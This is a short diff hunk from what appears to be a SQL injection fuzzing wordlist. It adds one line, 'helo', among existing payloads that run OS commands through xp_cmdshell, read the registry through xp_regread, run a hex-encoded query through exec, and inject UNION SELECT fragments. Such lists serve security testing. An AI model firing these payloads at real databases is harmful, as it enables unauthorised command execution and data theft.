@@ -227,6 +227,7 @@ declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 '; exec master..xp_cmdshell
 '; exec xp_regread
+helo
 t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' UNION SELECT
 ' UNION ALL SELECT
